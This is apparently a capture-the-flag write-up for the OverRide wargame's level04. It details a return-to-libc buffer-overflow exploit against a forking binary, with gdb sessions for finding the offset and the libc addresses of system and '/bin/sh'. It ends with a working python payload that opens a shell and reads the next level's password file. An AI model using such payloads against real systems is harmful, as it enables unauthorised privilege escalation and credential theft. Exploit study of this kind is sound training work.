### Download binary
``scp -P4242 level04@192.168.31.33:/home/users/level04/level04 ~/Bureau/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

---

### Main function analysis (refer to source code)

We learn from the source code that the program fork, which is an important information because it will change the behavior of gdb and other tool that we will use.

Our goal will be to use a buffer overflow vulnerability :

`gets(shellcode);`

to overwrite the EIP and make a **Return-to-libc attack**. The challenge we will be facing is that the overflow and the exploit are inside the child process.

First we need to get the offset of the EIP, we will re-use the python script:

``level04@OverRide:~$ gdb level04``
``(gdb) set follow-fork-mode child``
``(gdb) run``
>Starting program: /home/users/level04/level04
>[New process 1824]
>Give me some shellcode, k

``A0A1A2A3A4A5A6A7A8A9B0B1B2B3B4B5B6B7B8B9C0C1C2C3C4C5C6C7C8C9D0D1D2D3D4D5D6D7D8D9E0E1E2E3E4E5E6E7E8E9F0F1F2F3F4F5F6F7F8F9G0G1G2G3G4G5G6G7G8G9H0H1H2H3H4H5H6H7H8H9I0I1I2I3I4I5I6I7I8I9J0J1J2J3J4J5J6J7J8J9K0K1K2K3K4K5K6K7K8K9L0L1L2L3L4L5L6L7L8L9M0M1M2M3M4M5M6M7M8M9N0N1N2N3N4N5N6N7N8N9O0O1O2O3O4O5O6O7O8O9P0P1P2P3P4P5P6P7P8P9Q0Q1Q2Q3Q4Q5Q6Q7Q8Q9R0R1R2R3R4R5R6R7R8R9S0S1S2S3S4S5S6S7S8S9T0T1T2T3T4T5T6T7T8T9U0U1U2U3U4U5U6U7U8U9V0V1V2V3V4V5V6V7V8V9W0W1W2W3W4W5W6W7W8W9X0X1X2X3X4X5X6X7X8X9Y0Y1Y2Y3Y4Y5Y6Y7Y8Y9Z0Z1Z2Z3Z4Z5Z6Z7Z8Z9a0a1a2a3a4a5a6a7a8a9b0b1b2b3b4b5b6b7b8b9c0c1c2c3c4c5c6c7c8c9d0d1d2d3d4d5d6d7d8d9e0e1e2e3e4e5e6e7e8e9f0f1f2f3f4f5f6f7f8f9g0g1g2g3g4g5g6g7g8g9h0h1h2h3h4h5h6h7h8h9i0i1i2i3i4i5i6i7i8i9j0j1j2j3j4j5j6j7j8j9k0k1k2k3k4k5k6k7k8k9l0l1l2l3l4l5l6l7l8l9m0m1m2m3m4m5m6m7m8m9n0n1n2n3n4n5n6n7n8n9o0o1o2o3o4o5o6o7o8o9p0p1p2p3p4p5p6p7p8p9q0q1q2q3q4q5q6q7q8q9r0r1r2r3r4r5r6r7r8r9s0s1s2s3s4s5s6s7s8s9t0t1t2t3t4t5t6t7t8t9u0u1u2u3u4u5u6u7u8u9v0v1v2v3v4v5v6v7v8v9w0w1w2w3w4w5w6w7w8w9x0x1x2x3x4x5x6x7x8x``

>Program received signal SIGSEGV, Segmentation fault.
>[Switching to process 1824]
>0x39483848 in ?? ()

(In our script)

>Enter the address to find: **0x39483848**
>Offset found at: **156**

Now that we got our offset, we need to find the adress of **system()**, **exit()** and **/bin/sh**. exit() is needed to do it the clean way, but it's optionnal.

**Finding system adress**

``(gdb) info function system``
>0xf7e6aed0  system

**Finding exit adress**

``(gdb) info function exit``
>0xf7e5eb70  exit

**Finding /bin/sh**

``(gdb) b main``
>Breakpoint 1 at 0x80486cd

``(gdb) run``
>Starting program: /home/users/level04/level04
>Breakpoint 1, 0x080486cd in main ()

``(gdb) find __libc_start_main,+99999999,"/bin/sh"``
>0xf7f897ec
>warning: Unable to access target memory at 0xf7fd3b74, halting search.
>1 pattern found.
>(gdb) x/s 0xf7f897ec
>0xf7f897ec:	 "/bin/sh"

We can then build our final payload which will contain **156 filling char + adress of system + adresss of exit + adress of /bin/sh**

----

### Bypassing security

>level04@OverRide:~$ (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat) | ./level04
>Give me some shellcode, k

``whoami``
>level05

``cat /home/users/level05/.pass``
>3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN

